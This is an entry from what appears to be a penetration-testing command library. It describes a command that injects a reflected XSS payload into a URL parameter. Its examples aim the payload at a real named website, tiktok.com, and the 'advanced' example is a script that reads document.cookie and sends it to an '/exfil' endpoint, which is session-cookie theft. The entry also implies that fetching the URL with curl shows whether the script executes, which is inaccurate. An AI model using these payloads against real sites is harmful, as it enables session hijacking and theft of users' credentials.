---
id: 7a4f2f7b-5d7a-463f-beaf-87835f20507d
name: inject-xss-payload
type: command
executor: bash
data: 'https://target.com/?param=<script>alert(''XSS'')</script>'
output: null
created_at: '2025-12-11T06:10:22.173Z'
updated_at: '2025-12-11T06:10:22.173Z'
platforms:
  - Web
tags:
  - xss
  - injection
verified: false
validated: true
submitted: true
---

# inject-xss-payload

## Command

```bash
# This is a URL, not a direct command; visit in browser or use curl to fetch
curl "https://target.com/?param=<script>alert('XSS')</script>"
```

## Description

Crafts a URL with an XSS payload injected into a vulnerable parameter to test for execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `param` | The vulnerable parameter | Yes |
| `payload` | The JS to inject | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.tiktok.com/?param=<script>alert('XSS')</script>"
```

### Advanced Usage

```bash
curl "https://www.tiktok.com/?param=<script>fetch('/exfil?data='+document.cookie)</script>"
```

## Expected Output

The response HTML will include the executable script if vulnerable.

## Related

- [[commands/fuzz-url-parameter]]
- [[procedures/Exploit-Reflected-XSS]]
